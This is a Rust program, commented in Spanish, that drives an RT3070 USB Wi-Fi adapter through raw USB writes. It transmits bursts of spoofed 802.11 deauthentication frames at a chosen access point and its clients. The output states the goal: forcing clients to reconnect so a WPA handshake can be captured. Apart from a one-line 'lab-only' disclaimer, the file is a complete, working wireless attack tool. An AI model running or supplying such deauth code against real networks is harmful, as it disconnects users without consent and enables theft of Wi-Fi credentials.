// TX de deauth dirigido por USB crudo (EP 0x01) — mismo formato que tx.rs
// (TXINFO + TXWI + 802.11) pero con frame deauth (subtype 12) al objetivo.
// Uso: rt3070_deauth <BSSID> [canal] [count] [DA|broadcast] [reason] [delay_ms]
// E0-20 fase 2: reason 7 por defecto, ráfaga de 8 broadcast / 5 dirigido,
// 100 ms de separación y 1 Mbps (CCK) para alcance. Sin radiotap: este es
// acceso USB crudo (TXINFO + TXWI + 802.11), no inyección pcap.
// Requiere rt3070_init previo (firmware + radio ON + canal).
// Lab-only: usar SOLO contra redes propias.
mod common;

use common::*;
use std::process::exit;

fn parse_mac(s: &str) -> [u8; 6] {
    let parts: Vec<u8> = s.split([':', '-']).filter_map(|p| u8::from_str_radix(p, 16).ok()).collect();
    if parts.len() != 6 {
        eprintln!("❌ MAC inválida: {s} (formato AA:BB:CC:DD:EE:FF)");
        exit(2);
    }
    [parts[0], parts[1], parts[2], parts[3], parts[4], parts[5]]
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let bssid = args.get(1).map(|s| s.clone()).unwrap_or_else(|| {
        eprintln!("Uso: rt3070_deauth <BSSID> [canal] [count] [DA|broadcast] [reason] [delay_ms]"); exit(2);
    });
    let bssid = parse_mac(&bssid);
    let chan: u8 = args.get(2).map(|s| s.parse().unwrap_or(11)).unwrap_or(11);
    let count: u32 = args.get(3).map(|s| s.parse().unwrap_or(10)).unwrap_or(10);
    // MAC origen: la nuestra (spoof). Default: DE:AD:BE:EF:13:37
    let src = [0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37u8];
    // DA: broadcast (default) o MAC de cliente. Reason 7 (class 3) y 100 ms.
    let da = match args.get(4).map(|s| s.to_ascii_lowercase()) {
        Some(s) if s == "broadcast" || s.is_empty() => [0xff; 6],
        Some(s) => parse_mac(&s),
        None => [0xff; 6],
    };
    let reason: u16 = args.get(5).and_then(|s| s.parse().ok()).unwrap_or(7);
    let delay_ms: u64 = args.get(6).and_then(|s| s.parse().ok()).unwrap_or(100);

    let h = open_rt3070().expect("abrir RT3070 (usa rt3070_init antes)");

    // MAC/BSSID del transmisor (direcciones corregidas)
    let dw0: u32 = u32::from_le_bytes(src[0..4].try_into().unwrap());
    let dw1: u32 = 0x0000_0000 | (src[4] as u32) | ((src[5] as u32) << 8);
    reg_write(&h, MAC_ADDR_DW0, dw0).unwrap();
    reg_write(&h, MAC_ADDR_DW1, dw1).unwrap();
    reg_write(&h, MAC_BSSID_DW0, dw0).unwrap();
    reg_write(&h, MAC_BSSID_DW1, dw1).unwrap();

    // Reconfigurar canal (RF real) + PA
    if let Err(e) = config_channel_rt3070(&h, chan) { println!("⚠️ canal: {e:?}"); }
    let _ = enable_tx_pa(&h);

    // Frame deauth: subtype 12 (0xC0), reason configurable (7 = class 3).
    // SA y BSSID = AP; DA = broadcast o MAC del cliente.
    let mut f = Vec::new();
    f.extend_from_slice(&[0xC0, 0x00]); // FC: mgmt, subtype 12 (deauth)
    f.extend_from_slice(&[0x00, 0x00]); // duration
    f.extend_from_slice(&da);           // DA
    f.extend_from_slice(&bssid);        // SA = AP
    f.extend_from_slice(&bssid);        // BSSID = AP
    f.extend_from_slice(&[0x00, 0x00]); // seq
    f.extend_from_slice(&reason.to_le_bytes());

    // TXWI real (CCK 1Mbps, len en TXWI_W1, PACKETID=1 → feedback TX_STA_FIFO)
    let txwi = txwi_bytes(f.len() as u16, false, 1);
    let total = (4 + 20 + f.len()) as u16;
    // TXINFO igual que tx.rs: PKT_LEN | WIV | QSEL=2
    let info_w0: u32 = ((total as u32) & 0xFFFF) | (1 << 24) | (2 << 25);
    let mut txinfo = [0u8; 4];
    txinfo[0..4].copy_from_slice(&info_w0.to_le_bytes());

    let mut frame = Vec::new();
    frame.extend_from_slice(&txinfo);
    frame.extend_from_slice(&txwi);
    frame.extend_from_slice(&f);
    while frame.len() % 4 != 0 { frame.push(0); } // USB end pad

    println!("Deauth BSSID={} DA={} reason={} canal={} x{} delay={}ms (frame {} B, TX {} B)",
        bssid.map(|b| format!("{b:02X}")).join(":"),
        da.map(|b| format!("{b:02X}")).join(":"), reason, chan, count, delay_ms, f.len(), frame.len());

    // USB DMA config con campos reales del driver
    let _ = reg_write(&h, USB_DMA_CFG, USB_DMA_CFG_VALUE);
    std::thread::sleep(std::time::Duration::from_millis(10));

    const EP_TX: u8 = 0x01;
    let mut ok = 0;
    for i in 0..count {
        match h.write_bulk(EP_TX, &frame, std::time::Duration::from_millis(1000)) {
            Ok(_) => {
                ok += 1;
                if i < 3 || i % 10 == 0 { println!("  [{i}] deauth enviado ✅"); }
            }
            Err(e) => {
                println!("  [{i}] ERR {e:?}");
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
        }
        // Drenar TX_STA_FIFO tras cada frame: si se llena, el bulk OUT siguiente
        // da timeout (medido 2026-11-22: 2/8 frames y luego ERR Timeout).
        for line in drain_tx_status(&h, 8) {
            println!("  [status] {line}");
        }
        std::thread::sleep(std::time::Duration::from_millis(delay_ms));
    }
    // Feedback real del chip: cada frame con PACKETID≠0 deja TXDONE en la FIFO
    for line in drain_tx_status(&h, 16) {
        println!("  [status] {line}");
    }
    println!("\n{ok}/{count} deauth frames escritos al chip");
    if ok > 0 {
        println!("➡️  Verifica: la captura Npcap (otro driver, otra tarjeta o Kali) debería");
        println!("   mostrar EAPOL: el cliente se reconecta → handshake capturable.");
        println!("   (Las líneas [status] TXDONE success=true confirman TX real)");
    }
}
